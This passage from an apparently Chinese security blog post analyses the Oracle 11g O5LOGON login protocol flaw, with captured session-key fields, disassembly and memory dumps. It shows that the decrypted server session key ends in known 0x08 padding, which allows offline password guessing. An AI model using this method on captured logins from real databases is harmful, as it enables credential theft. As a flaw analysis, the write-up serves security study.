class="hljs-number">4</span>c <span class="hljs-number">4</span>f <span class="hljs-number">56</span> <span class="hljs-number">45</span> <span class="hljs-number">52</span> <span class="hljs-number">5</span>f <span class="hljs-number">49</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span>  UTH_FAILOVER_ID.<br><span class="hljs-attribute">02a0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                             .......<br></code></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">AUTH_SESSKEY_SRV</span><span class="hljs-punctuation">:</span> <span class="hljs-string">52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="hljs-attribute">AUTH_SESSKEY_CLI</span><span class="hljs-punctuation">:</span> <span class="hljs-string">FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="hljs-attribute">AUTH_PASSWORD</span><span class="hljs-punctuation">   :</span> <span class="hljs-string">2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="hljs-attribute">AUTH_VFR_DATA</span><span class="hljs-punctuation">   :</span> <span class="hljs-string">43E0BE20B32B0BB76E57</span><br></code></pre></td></tr></table></figure><h2 id="Oracle-O5LOGON-协议介绍"><a href="#Oracle-O5LOGON-协议介绍" class="headerlink" title="Oracle O5LOGON 协议介绍"></a>Oracle O5LOGON 协议介绍</h2><p>Oracle 11g password hash 算法为, 用户名 sys, 密码 nsfocus</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-meta">&gt;&gt;&gt; </span>hashlib.sha1(<span class="hljs-string">&#x27;nsfocus&#x27;</span> + <span class="hljs-string">&#x27;\x43\xE0\xBE\x20\xB3\x2B\x0B\xB7\x6E\x57&#x27;</span>).hexdigest()<br><span class="hljs-string">&#x27;c3d98762d258d4bd92c572065ddea9af38123f88&#x27;</span><br></code></pre></td></tr></table></figure><p>可以在Oracle数据中查询:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> name, password, spare4 <span class="hljs-keyword">from</span> sys.user$ <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SYS&#x27;</span>;<br><br>NAME                   PASSWORD<br><span class="hljs-comment">------------------------------ ------------------------------</span><br>SPARE4<br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br>SYS                <span class="hljs-number">0</span>F2417000362F55F<br>S:C3D98762D258D4BD92C572065DDEA9AF38123F8843E0BE20B32B0BB76E57<br><br>password hash： C3D98762D258D4BD92C572065DDEA9AF38123F88<br>salt         ： <span class="hljs-number">43E0</span>BE20B32B0BB76E57<br></code></pre></td></tr></table></figure><ol><li>client 发送用户名给server<br>2  server 判断是否是可用的用户名，如果用户名可用，进入下一步。</li><li>Server 加密AUTH_SESSKEY,  取出 salt</li></ol><p>使用AES192 CBC 加密AUTH_SESSKEY, key为oralce数据库中的20字节的password hash和4个<br>零(192bit)。</p><ol start="4"><li><p>Server 将加密的AUTH_SESSKEY和AUTH_VFR_DATA 发送给Client<br>AUTH_VFR_DATA 为salt</p></li><li><p>Client计算password hash (通过用户输入的密码), 使用Client计算的password hash<br>(加上4个零)为key 使用AES192 CBC算法加密Client AUTH_SESSKEY</p></li><li><p>Client 计算 Combine_SessKey<br>将解密的Server AUTH_SESSKEY 和 Client AUTH_SESSKEY的第17个字节开始的24个字节做异<br>或，将异或结果的前16字节做MD5, 后8字节做MD5, 得到Combine_SessKey</p></li><li><p>Client 使用 Combine_SessKey 加密用户输入的密码明文，得到 AUTH_PASSWORD<br>使用算法为AES192 CBC</p></li><li><p>Client 将加密的Client AUTH_SESSKEY和加密的AUTH_PASSWORD 发送给 Server</p></li><li><p>Server 使用数据库中的 password hash 解密 Client AUTH_SESSKEY</p></li><li><p>Server 尝试解密AUTH_PASSWORD 解密成功则认证通过</p></li></ol><p>参看:<br><a href="http://www.oxid.it/downloads/oracle_tns_aes192_check.txt">http://www.oxid.it/downloads/oracle_tns_aes192_check.txt</a></p><p>这个漏洞是生成server sesskey 时，在末尾添加了8个0x08, 因为salt已知（由服务器返回<br>），因此我们只需尝试计算SHA-1的password hash，然后利用这个password hash 去解密<br>server sesskey， 只要末尾是8个0x08 则说明这是正确的server sesskey，此时使用的密<br>码为正确的密码，原因是</p><p>AES 192 加密块长度为128 bit (16 byte), 分组加密如果明文内容不是块长度的整数倍时<br>需要填充。填充部分的内容为差的字节数，比如11字节的明文，需要在末尾填充5个0x5</p><p>从汇编代码里分析server session key 的生成过程，分析的程序为 Oracle.exe 11.2.0.1.0<br>oracle.exe调用 oran11.ztvo5ke 加密session key</p><p>oran11.ztvo5ke -&gt; oracrypt11.ztceenc  -&gt; orancrypt11.ztcen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">e_key</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> s[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">100</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sess_key</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> type;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">40</span>];<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pwd_hash</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> unknown1;<br>    <span class="hljs-type">uint32_t</span> hash_len;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> hash[<span class="hljs-number">20</span>];<br>&#125;<br><br>ztvo5ke ( e_key*, sess_key*, pwd_hash*, <span class="hljs-type">int</span>);<br></code></pre></td></tr></table></figure><p>sess_key.type &#x3D;&#x3D; 0x1492 ( AES 192 )</p><p>plaintext    24  + 16 &#x3D; 40 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:101BC481                 push    eax        ; unknown structure<br>.text:101BC482                 push    edx        ; encrypted session key<br>.text:101BC483                 push    28h        ; length<br>.text:101BC485                 push    ecx        ; plaintext session key<br>.text:101BC486                 push    0<br>.text:101BC488                 push    ebx        ; 0x18<br>.text:101BC489                 push    87004001h<br>.text:101BC48E                 call    ztceenc    ; AES 192<br>.text:101BC493                 add     esp, 1Ch<br>.text:101BC496                 mov     ebx, eax<br>.text:101BC498                 test    ebx, ebx<br>.text:101BC49A                 jnz     short loc_101BC4B8<br>.text:101BC49C                 lea     edx, [ebp+var_A4]<br>.text:101BC4A2                 lea     eax, [edi+2]<br>.text:101BC4A5                 push    eax       ; e_key+2<br>.text:101BC4A6                 push    [ebp+var_C8]<br>.text:101BC4AC                 push    edx       ; encryted session key<br>.text:101BC4AD                 call    ztucbtx<br></code></pre></td></tr></table></figure><p>ztceenc  运行前后的情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0DC3A4E4</span>                                      <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                       <br><span class="hljs-attribute">0DC3A4F4</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A504</span>  <span class="hljs-number">0</span>C <span class="hljs-number">4</span>A FE <span class="hljs-number">0</span>C <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> FF FF FF FF <span class="hljs-number">13</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A514</span>  <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                     <br><span class="hljs-attribute">0DC3A524</span>  <span class="hljs-number">44</span> <span class="hljs-number">94</span> <span class="hljs-number">3</span>E <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A534</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A544</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A554</span>  <span class="hljs-number">7</span>A EF <span class="hljs-number">5</span>B <span class="hljs-number">9</span>E <span class="hljs-number">89</span> D3 <span class="hljs-number">9</span>F <span class="hljs-number">07</span> <span class="hljs-number">62</span> A8 <span class="hljs-number">83</span> BB C6 <span class="hljs-number">4</span>D <span class="hljs-number">9</span>F D9..                        <br><span class="hljs-attribute">0DC3A564</span>  EA <span class="hljs-number">7</span>B <span class="hljs-number">90</span> <span class="hljs-number">1</span>C <span class="hljs-number">49</span> <span class="hljs-number">9</span>B <span class="hljs-number">73</span> <span class="hljs-number">36</span> BE <span class="hljs-number">60</span> AF F6 <span class="hljs-number">69</span> A4 ED <span class="hljs-number">37</span>..                        <br><span class="hljs-attribute">0DC3A574</span>  <span class="hljs-number">8</span>D <span class="hljs-number">1</span>D B3 B7 <span class="hljs-number">60</span> <span class="hljs-number">30</span> C7 <span class="hljs-number">56</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">8</span>C A5 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A584</span>  C8 B3 <span class="hljs-number">13</span> <span class="hljs-number">21</span> <span class="hljs-number">77</span> BF F6 <span class="hljs-number">84</span> <span class="hljs-number">28</span> <span class="hljs-number">3</span>A D6 <span class="hljs-number">54</span> <span class="hljs-number">9</span>F <span class="hljs-number">65</span> <span class="hljs-number">96</span> <span class="hljs-number">0</span>B..                        <br><span class="hljs-attribute">0DC3A594</span>  <span class="hljs-number">0</span>E <span class="hljs-number">0</span>A E4 <span class="hljs-number">60</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A5A4</span>  <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">84</span> A5 C3 <span class="hljs-number">0</span>D E0 <span class="hljs-number">3</span>E FE <span class="hljs-number">0</span>C A8 <span class="hljs-number">46</span> A7 <span class="hljs-number">0</span>C..                     <br><span class="hljs-attribute">0DC3A5B4</span>  <span class="hljs-number">94</span> <span class="hljs-number">77</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">0</span>C C6 C3 <span class="hljs-number">0</span>D <span class="hljs-number">4</span>A EA <span class="hljs-number">50</span> <span class="hljs-number">01</span> F4 C4 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A5C4</span>  F8 <span class="hljs-number">49</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">10</span> FB EC <span class="hljs-number">0</span>D..........................                     <br>                                                                                <br>                                                                                <br><span class="hljs-attribute">eax</span> = <span class="hljs-number">0</span>DC3A4F0                                                                  <br><span class="hljs-attribute">edx</span> = <span class="hljs-number">0</span>DC3A514                                                                  <br><span class="hljs-attribute">ecx</span> = <span class="hljs-number">0</span>DC3A554                                                                  <br><span class="hljs-attribute">ebx</span> = <span class="hljs-number">0</span>DC3A5A4                                                                  <br>                                                                                <br>                                                                                <br><span class="hljs-attribute">0DC3A4E4</span>                                      <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                     <br><span class="hljs-attribute">0DC3A4F4</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A504</span>  <span class="hljs-number">0</span>C <span class="hljs-number">4</span>A FE <span class="hljs-number">0</span>C <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> FF FF FF FF <span class="hljs-number">13</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A514</span>  <span class="hljs-number">61</span> <span class="hljs-number">15</span> <span class="hljs-number">91</span> <span class="hljs-number">7</span>F D6 AE B9 <span class="hljs-number">29</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> A4 <span class="hljs-number">02</span> A6 B1 <span class="hljs-number">2</span>B AA..                        <br><span class="hljs-attribute">0DC3A524</span>  BD <span class="hljs-number">3</span>B AA <span class="hljs-number">0</span>C <span class="hljs-number">13</span> C0 E5 <span class="hljs-number">18</span> <span class="hljs-number">8</span>E FE BA AC F5 <span class="hljs-number">4</span>C <span class="hljs-number">01</span> BE.                      <br><span class="hljs-attribute">0DC3A534</span>  <span class="hljs-number">96</span> <span class="hljs-number">8</span>F <span class="hljs-number">59</span> <span class="hljs-number">0</span>D B9 <span class="hljs-number">9</span>E <span class="hljs-number">2</span>C F6 <span class="hljs-number">98</span> <span class="hljs-number">74</span> <span class="hljs-number">1</span>F EF <span class="hljs-number">22</span> CE <span class="hljs-number">17</span> <span class="hljs-number">47</span>..                        <br><span class="hljs-attribute">0DC3A544</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A554</span>  <span class="hljs-number">7</span>A EF <span class="hljs-number">5</span>B <span class="hljs-number">9</span>E <span class="hljs-number">89</span> D3 <span class="hljs-number">9</span>F <span class="hljs-number">07</span> <span class="hljs-number">62</span> A8 <span class="hljs-number">83</span> BB C6 <span class="hljs-number">4</span>D <span class="hljs-number">9</span>F D9..                        <br><span class="hljs-attribute">0DC3A564</span>  EA <span class="hljs-number">7</span>B <span class="hljs-number">90</span> <span class="hljs-number">1</span>C <span class="hljs-number">49</span> <span class="hljs-number">9</span>B <span class="hljs-number">73</span> <span class="hljs-number">36</span> BE <span class="hljs-number">60</span> AF F6 <span class="hljs-number">69</span> A4 ED <span class="hljs-number">37</span>..                        <br><span class="hljs-attribute">0DC3A574</span>  <span class="hljs-number">8</span>D <span class="hljs-number">1</span>D B3 B7 <span class="hljs-number">60</span> <span class="hljs-number">30</span> C7 <span class="hljs-number">56</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">8</span>C A5 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A584</span>  C8 B3 <span class="hljs-number">13</span> <span class="hljs-number">21</span> <span class="hljs-number">77</span> BF F6 <span class="hljs-number">84</span> <span class="hljs-number">28</span> <span class="hljs-number">3</span>A D6 <span class="hljs-number">54</span> <span class="hljs-number">9</span>F <span class="hljs-number">65</span> <span class="hljs-number">96</span> <span class="hljs-number">0</span>B..                        <br><span class="hljs-attribute">0DC3A594</span>  <span class="hljs-number">0</span>E <span class="hljs-number">0</span>A E4 <span class="hljs-number">60</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A5A4</span>  <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">84</span> A5 C3 <span class="hljs-number">0</span>D E0 <span class="hljs-number">3</span>E FE <span class="hljs-number">0</span>C A8 <span class="hljs-number">46</span> A7 <span class="hljs-number">0</span>C..                     <br><span class="hljs-attribute">0DC3A5B4</span>  <span class="hljs-number">94</span> <span class="hljs-number">77</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">0</span>C C6 C3 <span class="hljs-number">0</span>D <span class="hljs-number">4</span>A EA <span class="hljs-number">50</span> <span class="hljs-number">01</span> F4 C4 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A5C4</span>  F8 <span class="hljs-number">49</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">10</span> FB EC <span class="hljs-number">0</span>D<br><br><br><span class="hljs-attribute">0DC3A4F0</span>   <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       offset<br><span class="hljs-attribute">0DC3A514</span>   <span class="hljs-number">61</span> <span class="hljs-number">15</span> <span class="hljs-number">91</span> <span class="hljs-number">7</span>F  ...  encrypted session key (<span class="hljs-number">0</span>x30 byte)<br><span class="hljs-attribute">0DC3A554</span>   <span class="hljs-number">7</span>A EF <span class="hljs-number">5</span>B <span class="hljs-number">9</span>E  ...  plaintext session key (<span class="hljs-number">0</span>x28 byte)<br><span class="hljs-attribute">0DC3A584</span>   <span class="hljs-number">8</span> B3 <span class="hljs-number">13</span> <span class="hljs-number">21</span>   ...  password  hash        (<span class="hljs-number">0</span>x18 byte)<br></code></pre></td></tr></table></figure><p>AES 192 加密40字节的明文，需要填充 8个 0x08</p><p>11.1</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">PASSWORD</span><span class="hljs-punctuation">:</span> <span class="hljs-string">           nsfocus</span><br><span class="hljs-attribute">AUTH_SESSKEY</span><span class="hljs-punctuation">:</span> <span class="hljs-string">       43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span><br><span class="hljs-attribute">AUTH_SESSKEY_CLIENT</span><span class="hljs-punctuation">:</span> <span class="hljs-string">C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span><br><span class="hljs-attribute">AUTH_PASSWORD</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span><br><span class="hljs-attribute">AUTH_VFR_DATA</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      3DA8A309D636ACF87004</span><br><br><span class="hljs-attribute">PASSWORD HASH</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      EF92924A1DB06441457FDABC24BF89055C8594F7</span><br></code></pre></td></tr></table></figure><p>11.2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PASSWORD</span>    :        nsfocus<br><span class="hljs-attribute">AUTH_SESSKEY</span>:        <span class="hljs-number">52</span>FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69<br><span class="hljs-attribute">AUTH_SESSKEY_C</span>       FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63<br><span class="hljs-attribute">AUTH_PASSWORD</span>        <span class="hljs-number">2</span>C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D<br><span class="hljs-attribute">AUTH_VFR_DATA</span>        <span class="hljs-number">43</span>E0BE20B32B0BB76E57<br><br><span class="hljs-attribute">PASSWORD</span> HASH:       C3D98762D258D4BD92C572065DDEA9AF38123F88 <span class="hljs-number">43</span>E0BE20B32B0BB76E57<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aes</span> key<br><span class="hljs-attribute">0000</span> ef <span class="hljs-number">92</span> <span class="hljs-number">92</span> <span class="hljs-number">4</span>a <span class="hljs-number">1</span>d b0 <span class="hljs-number">64</span> <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">7</span>f da bc <span class="hljs-number">24</span> bf <span class="hljs-number">89</span> <span class="hljs-number">05</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">5</span>c <span class="hljs-number">85</span> <span class="hljs-number">94</span> f7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br><span class="hljs-attribute">decrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">47</span> <span class="hljs-number">43</span> <span class="hljs-number">56</span> <span class="hljs-number">45</span> <span class="hljs-number">1</span>f <span class="hljs-number">61</span> c7 <span class="hljs-number">89</span> <span class="hljs-number">68</span> <span class="hljs-number">83</span> be ad ed c0 f4 <span class="hljs-number">54</span><br><span class="hljs-attribute">0010</span> e3 dd <span class="hljs-number">61</span> <span class="hljs-number">88</span> <span class="hljs-number">7</span>e <span class="hljs-number">78</span> d8 <span class="hljs-number">9</span>a bc <span class="hljs-number">8</span>f dc <span class="hljs-number">15</span> <span class="hljs-number">4</span>f a6 <span class="hljs-number">2</span>f <span class="hljs-number">26</span><br><span class="hljs-attribute">0020</span> a0 <span class="hljs-number">35</span> e2 <span class="hljs-number">63</span> <span class="hljs-number">68</span> bb <span class="hljs-number">02</span> <span class="hljs-number">1</span>b <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span><br><br><span class="hljs-attribute">encrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">43</span> fd <span class="hljs-number">38</span> <span class="hljs-number">02</span> <span class="hljs-number">93</span> <span class="hljs-number">77</span> c8 <span class="hljs-number">46</span> <span class="hljs-number">20</span> ae <span class="hljs-number">18</span> <span class="hljs-number">51</span> fc <span class="hljs-number">1</span>d <span class="hljs-number">23</span> <span class="hljs-number">14</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">09</span> <span class="hljs-number">98</span> <span class="hljs-number">50</span> <span class="hljs-number">64</span> de a0 d0 b8 d4 <span class="hljs-number">8</span>e <span class="hljs-number">50</span> e6 <span class="hljs-number">05</span> <span class="hljs-number">17</span> <span class="hljs-number">51</span> a5<br><span class="hljs-attribute">0020</span> d8 fd fe aa a9 f8 <span class="hljs-number">3</span>b <span class="hljs-number">99</span> f3 <span class="hljs-number">7</span>b <span class="hljs-number">05</span> <span class="hljs-number">1</span>f a6 <span class="hljs-number">7</span>f <span class="hljs-number">85</span> <span class="hljs-number">46</span><br><br><span class="hljs-attribute">AUTH_SESSKEY</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">43</span> fd <span class="hljs-number">38</span> <span class="hljs-number">02</span> <span class="hljs-number">93</span> <span class="hljs-number">77</span> c8 <span class="hljs-number">46</span> <span class="hljs-number">20</span> ae <span class="hljs-number">18</span> <span class="hljs-number">51</span> fc <span class="hljs-number">1</span>d <span class="hljs-number">23</span> <span class="hljs-number">14</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">09</span> <span class="hljs-number">98</span> <span class="hljs-number">50</span> <span class="hljs-number">64</span> de a0 d0 b8 d4 <span class="hljs-number">8</span>e <span class="hljs-number">50</span> e6 <span class="hljs-number">05</span> <span class="hljs-number">17</span> <span class="hljs-number">51</span> a5<br><span class="hljs-attribute">0020</span> d8 fd fe aa a9 f8 <span class="hljs-number">3</span>b <span class="hljs-number">99</span> f3 <span class="hljs-number">7</span>b <span class="hljs-number">05</span> <span class="hljs-number">1</span>f a6 <span class="hljs-number">7</span>f 